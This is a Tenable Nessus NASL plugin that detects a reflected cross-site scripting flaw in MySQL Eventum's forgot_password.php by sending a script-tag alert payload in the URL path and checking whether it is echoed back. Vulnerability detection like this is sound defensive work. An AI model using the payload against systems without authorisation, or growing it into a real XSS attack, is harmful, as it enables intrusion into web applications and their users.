#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(52054);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/11/28 21:52:57 $");

  script_bugtraq_id(46380);
  script_osvdb_id(70960);
  script_xref(name:"Secunia", value:"43320");

  script_name(english:"MySQL Eventum forgot_password.php XSS");
  script_summary(english:"Attempts to exploit a cross-site scripting vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is affected by a
cross-site scripting vulnerability.");

  script_set_attribute(attribute:"description", value:
"The version of the MySQL Eventum installed on the remote host is
affected by a cross-site scripting vulnerability because the
'forgot_password.php' script does not properly sanitize user input
before returning it as part of the HTML response.

Note, several other cross-site scripting vulnerabilities have been
reported to exist in this version of MySQL Eventum.");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 2.3.1 or greater.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);
  script_set_attribute(attribute:"see_also", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-4989.php");
  script_set_attribute(
    attribute:"see_also",
    value:"https://bugs.launchpad.net/eventum/+bug/706385"
  );

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/02/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/02/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/02/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mysql:eventum");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("mysql_eventum_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/eventum", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'eventum', port:port, exit_on_fail:TRUE);
dir = install['dir'];


# Attempt to exploit the vulnerability.
payload = SCRIPT_NAME;
exploit = '>"><script>alert(/'+urlencode(str:payload)+'/)</script>';
expected_output = 'forgot_password.php/>"><script>alert(/'+payload+'/)</script>';
extra_pass_re   = "<title>Request a Password - Eventum</title>";

url = '/forgot_password.php/'+exploit;
vuln = test_cgi_xss(
  port     : port,
  dirs     : make_list(dir),
  cgi      : url,
  qs       : "",
  pass_re  : extra_pass_re,
  pass_str : expected_output
);

if (!vuln) exit(0, 'The MySQL Eventum install at '+build_url(qs:dir+'/', port:port)+ ' is not affected.');
